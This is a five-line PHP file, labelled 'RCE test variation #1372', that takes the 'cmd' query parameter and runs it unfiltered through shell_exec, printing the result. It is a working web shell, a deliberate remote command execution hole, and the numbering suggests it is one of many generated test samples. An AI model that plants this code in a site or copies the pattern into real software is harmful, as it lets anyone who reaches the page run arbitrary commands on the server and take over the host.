<?php
// RCE test variation #1372
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>